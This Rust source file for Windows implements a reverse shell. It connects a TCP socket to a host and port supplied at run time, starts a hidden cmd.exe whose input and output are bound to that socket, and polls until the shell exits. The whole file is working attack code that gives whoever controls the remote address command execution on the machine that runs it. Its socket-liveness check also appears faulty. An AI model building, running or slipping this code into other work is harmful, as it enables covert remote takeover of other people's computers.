extern crate winapi;

use core::default::Default;
use std::ffi::{CString, OsStr};
use std::iter::once;
use std::mem;
use std::os::windows::ffi::OsStrExt;
use std::ptr;
use std::thread::sleep;
use std::time::Duration;

use winapi::ctypes::c_void;
use winapi::shared::inaddr::IN_ADDR;
use winapi::shared::ws2def::{
    SOCKADDR,
    SOCKADDR_IN,
    AF_INET,
    SOCK_STREAM,
    IPPROTO_TCP,
};
use winapi::shared::minwindef::MAKEWORD;
use winapi::um::minwinbase::STILL_ACTIVE;
use winapi::um::processthreadsapi::{
    CreateProcessW,
    GetExitCodeProcess,
    STARTUPINFOW,
    PROCESS_INFORMATION,
};
use winapi::um::winbase::{
    STARTF_USESTDHANDLES,
    CREATE_NO_WINDOW,
};
use winapi::um::winnt::HANDLE;
use winapi::um::winsock2::{
    WSAStartup,
    WSASocketW,
    WSAGetLastError,
    connect,
    gethostbyname,
    htons,
    recv,
    closesocket,
    MSG_PEEK,
    WSADATA,
};
use winapi::um::ws2tcpip::inet_pton;

pub fn shell(addr: &str)
{
    /* you might be wondering why we're doing this instead of using Stdio and
     * Command objects and TcpStream. that's because if we pass it a handle using
     * a recasted raw socket, it has overlapped IO and can't be inherited. that
     * messes things up. there's no way to turn it off, so instead we use ffi
     * to create the child process and socket. */
    println!("[+] initializing winsock...");
    let mut version: WSADATA = Default::default();
    unsafe { WSAStartup(MAKEWORD(2,2), &mut version as *mut WSADATA); }
    
    let chunks: Vec<&str> = addr.split(':').collect();
    if chunks.len() != 2 { panic!("bad address:port string"); }
    
    let host = CString::new(chunks[0]).unwrap();
    let port: u16 = chunks[1].parse().expect("bad port arg");

    let hostent = unsafe { gethostbyname(host.as_ptr()) };
    let mut address: SOCKADDR_IN = Default::default();

    if hostent == ptr::null_mut() {
        unsafe {
            let result = inet_pton(AF_INET
                                   ,host.as_ptr()
                                   ,&mut address.sin_addr as *mut IN_ADDR as *mut c_void);
            if result != 1 { panic!("hostname is not an IPv4 address or a hostname"); }
        }
    }
    else {
        unsafe { address.sin_addr = **((*hostent).h_addr_list as *mut *mut IN_ADDR); }
    }

    address.sin_family = AF_INET as u16;
    address.sin_port = unsafe { htons(port) };

    /* connect to host and port */
    println!("[+] connecting to host...");
    let socket = unsafe { WSASocketW(AF_INET
                                     ,SOCK_STREAM
                                     ,IPPROTO_TCP as i32
                                     ,ptr::null_mut()
                                     ,0
                                     ,0)
    };
    let connected = unsafe { connect(socket
                                     ,&mut address as *mut SOCKADDR_IN as *mut SOCKADDR
                                     ,mem::size_of::<SOCKADDR>() as i32)
    };
    if connected != 0 { panic!("connection failed (error {})", unsafe { WSAGetLastError() }); }
    
    println!("[+] connected");

    let mut shell: Vec<u16> = OsStr::new("cmd.exe")
        .encode_wide()
        .chain(once(0))
        .collect();

    let mut start_info: STARTUPINFOW = Default::default();
    let mut proc_info: PROCESS_INFORMATION = Default::default();

    /* redirect stdin to socket
     * redirect stdout/stderr to socket */
    println!("[+] using socket as file descriptors");

    start_info.cb = mem::size_of::<STARTUPINFOW>() as u32;
    start_info.dwFlags = STARTF_USESTDHANDLES;
    start_info.hStdInput = socket as HANDLE;
    start_info.hStdOutput = socket as HANDLE;
    start_info.hStdError = socket as HANDLE;

    let start_ptr = &mut start_info as *mut STARTUPINFOW;
    let proc_ptr = &mut proc_info as *mut PROCESS_INFORMATION;

    println!("[+] creating shell");
    
    let create_result = unsafe {
        CreateProcessW(ptr::null_mut()
                       ,shell.as_mut_ptr()
                       ,ptr::null_mut()
                       ,ptr::null_mut()
                       ,1
                       ,CREATE_NO_WINDOW
                       ,ptr::null_mut()
                       ,ptr::null_mut()
                       ,start_ptr
                       ,proc_ptr)
    };

    if create_result == 0 { panic!("spawn shell failed"); }

    println!("[+] spawned shell process");
    
    /* while running, check if socket is alive */
    loop {
        let mut exit_code: u32 = 0;
        let exit_ptr = &mut exit_code as *mut u32;
        let result = unsafe { GetExitCodeProcess(proc_info.hProcess, exit_ptr) };

        if result == 0 {
            println!("[!] GetExitCodeProcess failed");
            break;
        }
        else if exit_code != STILL_ACTIVE {
            println!("[!] shell exited ({})", exit_code);
            break;
        }

        let mut peek_buffer = vec![0, 1];
        let peek = unsafe { recv(socket
                                 ,peek_buffer.as_mut_ptr()
                                 ,1
                                 ,MSG_PEEK) };

        if peek != 0 {
            println!("[!] socket read failed");
            break;
        }

        sleep(Duration::from_secs(1));
    }

    println!("[+] shutting down");
    
    /* close socket */
    unsafe { closesocket(socket); }
}
